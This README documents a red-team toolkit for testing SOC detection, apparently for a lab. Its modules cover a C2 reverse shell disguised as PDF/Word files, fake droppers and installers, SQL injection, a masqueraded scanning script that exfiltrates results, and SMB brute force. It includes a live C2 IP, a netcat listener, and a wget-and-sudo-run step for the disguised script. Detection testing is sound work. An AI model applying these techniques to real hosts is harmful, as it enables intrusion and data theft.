# Cyberfortress RedOps

Attack simulation toolkit for testing Intelligent SOC Ecosystem detection capabilities, aligned with the MITRE ATT&CK framework.

## Table of Contents

- [Cyberfortress RedOps](#cyberfortress-redops)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Attack Modules](#attack-modules)
  - [Project Structure](#project-structure)
  - [Requirements](#requirements)
  - [Build Tool](#build-tool)
    - [Commands](#commands)
    - [Build Configurations](#build-configurations)
  - [Module Details](#module-details)
    - [C2 Outbound Connection](#c2-outbound-connection)
    - [SQL Injection](#sql-injection)
    - [Malware Execution](#malware-execution)
    - [Network Scanning](#network-scanning)
    - [SMB Bruteforce](#smb-bruteforce)
  - [Detection Rules Summary](#detection-rules-summary)
  - [Usage](#usage)
  - [License](#license)

## Overview

Cyberfortress RedOps is a collection of attack simulation modules designed to test and validate SOC detection capabilities. Each module simulates real-world attack techniques mapped to the MITRE ATT&CK framework, enabling security teams to verify their detection and response mechanisms.

## Attack Modules

| Module                 | MITRE ATT&CK     | Target                         | Expected Response       |
| ---------------------- | ---------------- | ------------------------------ | ----------------------- |
| c2-outbound-connection | T1071, T1571     | Windows 11 Client -> C2 Server | Isolate Host + Block IP |
| sql-injection          | T1190            | Kali -> DVWA Web Server        | Block Attacker IP       |
| malware-execution      | T1204.002, T1105 | Windows 11 Client              | Isolate Host            |
| network-scanning       | T1046, T1041     | Ubuntu -> LAN                  | Isolate Host            |
| smb-bruteforce         | T1110.001        | Kali -> Windows Server         | Block Attacker IP       |

## Project Structure

```
Cyberfortress-RedOps/
├── build.py                 # CLI build tool for creating Windows executables
├── src/
│   ├── c2-outbound-connection/
│   │   ├── c2_reverse_shell.py      # C2 reverse shell script
│   │   ├── dropper.py               # Fake document dropper
│   │   ├── config.txt               # C2 host/port configuration
│   │   ├── malicious_ip.txt         # IOC IP list
│   │   ├── suricata.local.rules     # Suricata detection rules
│   │   ├── c2_detection.zeek        # Zeek detection script
│   │   ├── zeek.sig                 # Zeek signatures
│   │   └── icons/                   # PDF/Word disguise icons
│   │
│   ├── sql-injection/
│   │   ├── sqli_attack.sh           # SQLmap wrapper script
│   │   ├── config.json              # Target and credentials config
│   │   └── suricata.local.rules     # Detection rules
│   │
│   ├── malware-execution/
│   │   ├── fake_installer.py        # Fake installer dropper
│   │   ├── README.html              # Fake installation guide
│   │   └── suricata.local.rules     # Detection rules
│   │
│   ├── network-scanning/
│   │   ├── system_health_check.sh   # Trojan script (disguised)
│   │   ├── listener.py              # Attacker receiver
│   │   ├── config.json              # Scan configuration
│   │   └── suricata.local.rules     # Detection rules
│   │
│   └── smb-bruteforce/
│       ├── smb_bruteforce.sh        # SMB password attack script
│       ├── config.json              # Target configuration
│       └── suricata.local.rules     # Detection rules
│
├── dist/                    # Built executables output directory
├── build/                   # Build cache directory
└── docs/
    └── attack_modules.md    # Detailed module documentation
```

## Requirements

- Python 3.8+
- PyInstaller (for building Windows executables)
- Kali Linux or equivalent (for attack execution)
- Target machines (Windows 11, Ubuntu, DVWA server)

## Build Tool

The `build.py` CLI tool compiles Python scripts into Windows executables using PyInstaller.

### Commands

```bash
# List available modules
python build.py --list

# Build specific module
python build.py c2-outbound-connection

# Build with stealth options (hidden console)
python build.py c2-shell-pdf --noconsole

# Build all modules
python build.py all

# Clean build artifacts
python build.py --clean
```

### Build Configurations

| Module                 | Output Name               | Description                                |
| ---------------------- | ------------------------- | ------------------------------------------ |
| c2-outbound-connection | c2_reverse_shell.exe      | C2 Reverse Shell - MITRE ATT&CK T1071      |
| c2-shell-word          | Meeting_Notes_2024.exe    | C2 Shell with Word icon (stealth)          |
| c2-shell-pdf           | Financial_Report_2025.exe | C2 Shell with PDF icon (stealth)           |
| dropper                | Invoice_2024.exe          | Fake Document Dropper - T1204.002          |
| dropper-pdf            | Report_Q4_2024.exe        | Fake PDF Dropper - T1204.002               |
| malware-installer      | install.exe               | Fake Installer Dropper - T1204.002 + T1105 |

## Module Details

### C2 Outbound Connection

Simulates a compromised Windows workstation establishing beacon connections to a Command & Control server.

**MITRE ATT&CK Techniques:**
- T1071.001 - Application Layer Protocol: Web (HTTP/HTTPS for C2 communication)
- T1571 - Non-Standard Port
- T1059.001 - PowerShell (remote command execution)

**Configuration (config.txt):**
```ini
C2_HOST=147.185.133.114
C2_PORT=80
RETRY_INTERVAL=3
```

**Execution:**
```bash
# Attacker (Kali) - Start C2 listener
nc -lvnp 80

# Victim (Windows) - Run malware
.\Financial_Report_2025.exe
```

**Expected Detection:**
- Suricata: Alert SID 9000010-9000015
- Zeek: Notice C2Detection::C2_Connection_Attempt
- Wazuh: Rule trigger -> Active Response
- SmartXDR: Classify as ATTACK -> Isolate Host + Block IP

---

### SQL Injection

External attacker performs SQL Injection attacks against DVWA web application.

**MITRE ATT&CK Techniques:**
- T1190 - Exploit Public-Facing Application
- T1059.001 - Command and Scripting Interpreter

**Configuration (config.json):**
```json
{
    "target": {
        "host": "dvwa.local",
        "port": 80,
        "base_url": "/vulnerabilities/sqli/"
    },
    "credentials": {
        "username": "admin",
        "password": "password"
    }
}
```

**Execution:**
```bash
# Attacker (Kali)
cd src/sql-injection
chmod +x sqli_attack.sh
./sqli_attack.sh
```

**Expected Detection:**
- Suricata: Alert SID 9001001-9001010
- ModSecurity WAF: Block request (403)
- SmartXDR: Classify as ATTACK -> Block Attacker IP

---

### Malware Execution

User is deceived into running a fake installer that downloads EICAR test malware.

**MITRE ATT&CK Techniques:**
- T1204.002 - User Execution: Malicious File
- T1105 - Ingress Tool Transfer
- T1036 - Masquerading

**Payload:**
- Downloads EICAR test file from `https://secure.eicar.org/eicar.com.txt`
- Displays fake "Installing..." progress bar
- Masquerades as "Media Player Pro" installer

**Execution:**
```powershell
# Victim (Windows)
Expand-Archive MediaPlayerPro_Setup.zip -DestinationPath .
.\install.exe
```

**Expected Detection:**
- Suricata: Alert SID 9003001-9003003
- Windows Defender: Detect EICAR -> Quarantine
- Wazuh: Sysmon Event 11 (FileCreate)
- SmartXDR: Classify as ATTACK -> Isolate Host

---

### Network Scanning

Compromised Ubuntu machine runs disguised network reconnaissance script that exfiltrates scan results.

**MITRE ATT&CK Techniques:**
- T1046 - Network Service Scanning
- T1041 - Exfiltration Over C2 Channel
- T1036 - Masquerading

**Configuration (config.json):**
```json
{
    "attacker": {
        "host": "192.168.71.100",
        "port": 8080
    },
    "scan": {
        "target_network": "192.168.85.0/24",
        "ports": "22,80,443,3389,8080"
    }
}
```

**Execution:**
```bash
# Attacker (Kali) - Start listener
cd src/network-scanning
python3 listener.py --port 8080

# Victim (Ubuntu) - Download and run
wget http://192.168.71.100:8080/system_health_check.sh
chmod +x system_health_check.sh
sudo ./system_health_check.sh
```

**Expected Detection:**
- Suricata: Alert SID 9002001-9002012
- Zeek: Notice C2Detection::C2_Connection_Attempt
- SmartXDR: Classify as ATTACK -> Isolate Host

---

### SMB Bruteforce

Password brute force attack against Windows SMB service.

**MITRE ATT&CK Techniques:**
- T1110.001 - Brute Force: Password Guessing

**Execution:**
```bash
# Attacker (Kali)
cd src/smb-bruteforce
chmod +x smb_bruteforce.sh
./smb_bruteforce.sh
```

**Expected Detection:**
- Suricata: Multiple failed login alerts
- Wazuh: Authentication failure rules
- SmartXDR: Classify as ATTACK -> Block Attacker IP

## Detection Rules Summary

| Module                 | SID Range       | Rule Count |
| ---------------------- | --------------- | ---------- |
| c2-outbound-connection | 9000001-9000022 | 15         |
| sql-injection          | 9001001-9001020 | 10         |
| network-scanning       | 9002001-9002012 | 8          |
| malware-execution      | 9003001-9003020 | 8          |

## Usage

1. **Setup Environment**
   - Configure target machines in your test lab
   - Deploy Suricata/Zeek sensors on network path
   - Ensure SmartXDR is connected to receive alerts

2. **Build Attack Tools**
   ```bash
   python build.py all
   ```

3. **Execute Attack Scenarios**
   - Transfer executables to victim machines
   - Run attack scripts from Kali Linux
   - Monitor detection alerts in SmartXDR

4. **Validate Detection**
   - Verify alerts are generated for each attack
   - Confirm automated response actions (host isolation, IP blocking)
   - Document detection gaps for improvement

## License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

---

**Disclaimer:** This toolkit is intended for authorized security testing and educational purposes only. Unauthorized use of these tools against systems you do not own or have explicit permission to test is illegal.
